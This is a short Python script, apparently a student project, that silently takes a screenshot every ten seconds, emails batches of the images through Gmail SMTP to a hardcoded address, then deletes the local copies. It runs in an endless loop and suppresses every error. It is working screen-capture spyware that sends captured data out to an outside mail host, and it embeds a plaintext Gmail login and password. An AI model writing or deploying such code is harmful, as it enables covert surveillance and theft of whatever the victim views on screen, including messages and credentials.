import pyautogui
import time
import os
import smtplib
import shutil
from email.message import EmailMessage

def send_mail():
    try:
        msg = EmailMessage()
        msg["From"] = 'majorprojectmail7@gmail.com'
        msg["To"] = 'majorprojectmail7@gmail.com'
        msg["Subject"] = "Screenshots"

        body = "Screenshots"
        msg.set_content(body)

        images = os.listdir("Tempshots")
        path = "C:\\Tempshots\\"
        for image in images:
            file = open(path+image, "rb")
            data = file.read()
            file_name = file.name
            msg.add_attachment(data, maintype = 'image', subtype = "png", filename = file_name)
            file.close()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login('majorprojectmail7@gmail.com', 'Asus@123')
        server.send_message(msg)

        server.close()
        shutil.rmtree("Tempshots")
    except Exception as mail_error:
        shutil.rmtree("Tempshots")
        pass

count = 0
#counter = 0
os.chdir("C:\\")
if "Tempshots" in os.listdir("C:"):
    send_mail()
else:
    os.mkdir("C:Tempshots")
while True:
    if "Tempshots" not in os.listdir("C:"):
        os.mkdir('C:Tempshots')
    pic = pyautogui.screenshot()
    pic.save("C:Tempshots\\Screenshot_"+str(count)+".png")
    count += 1
    #if (count - counter) > 31:
    if count >= 5:
        send_mail()
        count = 0
    time.sleep(10)